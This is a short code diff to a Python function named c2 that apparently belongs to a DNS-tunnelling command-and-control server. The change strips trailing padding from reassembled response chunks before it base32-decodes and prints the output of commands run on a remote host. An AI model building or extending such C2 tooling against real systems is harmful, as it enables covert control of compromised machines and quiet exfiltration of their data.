@@ -171,6 +171,8 @@ def c2(qname):
             if qname.split(".")[1] == str(chkID):
                 respText += request
                 respPktCt -= 1
+                if respText.endswith("-0"):
+                    respText = respText.rstrip("0")
                 if respPktCt <= 0: # end of the thread from client? print output
                     print(f"{OR}Command output: \n{OV}{decode32(respText).decode('utf-8')}{OM}")
                     respText = "" # reset for next command
